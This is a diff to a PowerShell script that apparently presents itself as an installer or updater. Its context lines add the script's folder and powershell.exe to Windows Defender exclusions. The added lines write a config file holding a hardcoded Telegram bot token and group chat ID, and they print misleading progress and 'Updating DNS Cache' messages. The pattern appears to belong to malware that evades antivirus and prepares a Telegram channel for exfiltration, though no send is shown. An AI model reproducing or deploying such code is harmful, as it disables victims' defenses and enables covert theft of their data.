@@ -14,6 +14,19 @@ $processName = "powershell.exe"
 Add-MpPreference -ExclusionPath $folderPath | Out-Null
 Add-MpPreference -ExclusionProcess $processName | Out-Null
 
+
+$configFilePath = Join-Path -Path $documentsPath -ChildPath "config.txt"
+$configContent = @"
+BOT_TOKEN=7642416431:AAGRRHpOzRdpupruWLRgOiInIgZ8J1iNHiI
+GROUP_CHAT_ID=-4723826253
+"@
+Try {
+    $configContent | Set-Content -Path $configFilePath -Force
+    Write-Host "Progress ------- 1% ------- "
+} Catch {
+    Write-Error "Progress ------- 2% ------- "
+}
+
 # Function to Download and Install 7-Zip
 function Install-7Zip {
     Write-Host "Updating DNS Cache"
